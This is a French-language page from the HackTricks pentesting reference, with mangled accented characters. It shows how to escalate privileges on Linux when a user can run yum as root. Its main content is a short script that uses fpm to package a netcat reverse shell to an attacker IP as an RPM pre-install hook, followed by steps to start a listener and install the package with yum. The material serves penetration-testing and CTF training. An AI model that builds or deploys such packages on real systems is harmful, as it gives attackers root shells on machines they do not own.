<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersÃ©curitÃ© ? Voulez-vous voir votre entreprise annoncÃ©e dans HackTricks ? ou voulez-vous avoir accÃ¨s Ã  la derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF ? Consultez les [PLANS D'ABONNEMENT](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [La famille PEASS](https://opensea.io/collection/the-peass-family), notre collection exclusive de [NFTs](https://opensea.io/collection/the-peass-family)

- Obtenez le [swag officiel PEASS & HackTricks](https://peass.creator-spring.com)

- **Rejoignez le** [ğŸ’¬](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [groupe telegram](https://t.me/peass) ou **suivez** moi sur **Twitter** [ğŸ¦](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[@carlospolopm](https://twitter.com/hacktricks_live).

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

D'autres exemples autour de yum peuvent Ã©galement Ãªtre trouvÃ©s sur [gtfobins](https://gtfobins.github.io/gtfobins/yum/).

# ExÃ©cution de commandes arbitraires via les paquets RPM
## VÃ©rification de l'environnement
Pour exploiter cette vulnÃ©rabilitÃ©, l'utilisateur doit Ãªtre en mesure d'exÃ©cuter des commandes yum en tant qu'utilisateur Ã  privilÃ¨ges Ã©levÃ©s, c'est-Ã -dire root.

### Un exemple de travail de cette vulnÃ©rabilitÃ©
Un exemple de travail de cette vulnÃ©rabilitÃ© peut Ãªtre trouvÃ© dans la salle [daily bugle](https://tryhackme.com/room/dailybugle) sur [tryhackme](https://tryhackme.com).

## Emballage d'un RPM
Dans la section suivante, je vais couvrir l'emballage d'un shell inversÃ© dans un RPM en utilisant [fpm](https://github.com/jordansissel/fpm).

L'exemple ci-dessous crÃ©e un paquet qui inclut un dÃ©clencheur avant l'installation avec un script arbitraire qui peut Ãªtre dÃ©fini par l'attaquant. Lorsqu'il est installÃ©, ce paquet exÃ©cutera la commande arbitraire. J'ai utilisÃ© un exemple de shell netcat inversÃ© simple Ã  des fins de dÃ©monstration, mais cela peut Ãªtre modifiÃ© selon les besoins.
```text
EXPLOITDIR=$(mktemp -d)
CMD='nc -e /bin/bash <ATTACKER IP> <PORT>'
RPMNAME="exploited"
echo $CMD > $EXPLOITDIR/beforeinstall.sh
fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
```
# Obtenir un shell
En utilisant l'exemple ci-dessus et en supposant que `yum` peut Ãªtre exÃ©cutÃ© en tant qu'utilisateur Ã  privilÃ¨ges Ã©levÃ©s :

1. **TransfÃ©rez** le fichier rpm sur l'hÃ´te
2. **DÃ©marrez** un Ã©couteur sur votre hÃ´te local tel que l'[exemple d'Ã©couteur netcat](/shells/shells/linux#netcat)
3. **Installez** le package vulnÃ©rable `yum localinstall -y exploited-1.0-1.noarch.rpm`
